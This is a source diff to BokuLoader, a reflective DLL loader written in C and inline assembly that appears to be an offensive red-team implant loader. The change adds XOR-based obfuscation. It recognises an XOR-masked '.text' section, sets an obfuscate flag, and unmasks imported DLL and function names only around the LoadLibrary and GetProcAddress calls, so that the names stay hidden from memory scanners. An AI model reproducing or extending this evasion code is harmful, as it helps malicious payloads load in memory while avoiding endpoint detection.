@@ -58,6 +58,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
 void doSections(Dll * rdll_dst, Dll * rdll_src){
     // Save .text section address and size for destination RDLL so we can make it RE later
     int textSectionFlag = FALSE;
+    int ObfuscateFlag   = FALSE;
     rdll_dst->TextSection = NULL;
     rdll_dst->TextSectionSize = 0;
     unsigned long numberOfSections = rdll_src->NumberOfSections;
@@ -96,21 +97,25 @@ void doSections(Dll * rdll_dst, Dll * rdll_src){
         {
             __asm__(
                 "mov rcx, [rax] \n"        // name of the section
-                "xor rax, rax \n"
-                "mov rdx, 0x747865742e \n" // 0x747865742e == '.text'
-                "cmp rcx, rdx \n"
-                "jne nottext \n"
-                "mov rax, 0x1 \n"
-                "nottext: \n"
-                : "=r" (textSectionFlag)    // RAX OUT
-                : "r" (rdll_src->NthSection) // RAX IN
+                "mov r8, 0xB7BBA6B7ED \n" // 0xB7BBA6B7ED == '.text' XOR 0xC3
+                "cmp rcx, r8 \n"
+                "jne notObfuscated \n"
+                "mov rax, 0xC3  \n"        // ObfuscateFlag == TRUE
+                "jmp exitTextTest \n"
+              "notObfuscated: \n"
+                "mov rax, 0x0  \n"        // ObfuscateFlag == FALSE
+              "exitTextTest: \n"
+                : "=r" (ObfuscateFlag)        // RAX OUT
+                : "r" (rdll_src->NthSection)  // RAX IN
             );
             // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
-            if(textSectionFlag == TRUE)
+            rdll_dst->TextSection     = section.dst_rdll_VA;
+            rdll_dst->TextSectionSize = section.SizeOfSection;
+            if(ObfuscateFlag == 0xC3)
             {
-                rdll_dst->TextSection = section.dst_rdll_VA;
-                rdll_dst->TextSectionSize = section.SizeOfSection;
+                rdll_dst->obfuscate = 0xC3C3C3C3C3C3C3C3;
             }
+            textSectionFlag = TRUE;
         }
         // Copy the section from the source address to the destination for the size of the section
         Memcpy(section.dst_rdll_VA, section.src_rdll_VA, section.SizeOfSection);
@@ -121,6 +126,7 @@ void doSections(Dll * rdll_dst, Dll * rdll_src){
 
 void doImportTable(APIS * api, Dll * rdll_dst, Dll * rdll_src){
     void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
+    unsigned __int64 len_importName, len_EntryName;
     // Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
     void* DataDirectory = rdll_src->OptionalHeader + 0x78;
     // Get the Address of the Import Directory from the Data Directory
@@ -150,7 +156,14 @@ void doImportTable(APIS * api, Dll * rdll_dst, Dll * rdll_src){
     // The last entry in the image import directory is all zeros
     while(importNameRVA)
     {
-        dll_import.dllBase = xLoadLibrary(importName); 
+        if(rdll_dst->obfuscate){
+            len_importName = (unsigned __int64)StringLengthA(importName);
+            xorc(len_importName, importName, XORKEY);
+            dll_import.dllBase = xLoadLibrary(importName); 
+            xorc(len_importName, importName, XORKEY); // remask the import DLL name
+        }else{
+            dll_import.dllBase = xLoadLibrary(importName); 
+        }
         __asm__(
             "xor rcx, rcx \n"   // importLookupTableEntry = VA of the OriginalFirstThunk
             "mov ecx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into Ecx
@@ -237,7 +250,14 @@ void doImportTable(APIS * api, Dll * rdll_dst, Dll * rdll_src){
                       "r" (rdll_dst->dllBase)   // RDX IN
                 );
                 // patch in the address for this imported function
-                EntryAddress = xGetProcAddress(EntryName, &dll_import);
+                if(rdll_dst->obfuscate){
+                    len_EntryName = (unsigned __int64)StringLengthA(EntryName);
+                    xorc(len_EntryName, EntryName, XORKEY);
+                    EntryAddress = xGetProcAddress(EntryName, &dll_import);
+                    xorc(len_EntryName, EntryName, XORKEY); // remask the import entry name
+                }else{
+                    EntryAddress = xGetProcAddress(EntryName, &dll_import);
+                }
                 __asm__(
                     "mov [rax], rdx \n" // write the address of the imported api to our import table
                     : // no outputs
@@ -527,6 +547,14 @@ PVOID WINAPI RtlSecureZeroMemory(PVOID ptr,SIZE_T cnt){
   volatile char *vptr = (volatile char *)ptr;
   __stosb ((PBYTE)((DWORD64)vptr),0,cnt);
   return ptr;
+}
+
+void xorc(unsigned __int64 length, unsigned char * buff, unsigned char maskkey) {
+  int i;
+  for (i = 0; i < length; ++i)
+  {
+    buff[i] ^= maskkey;
+  }
 }
 
 __asm__(
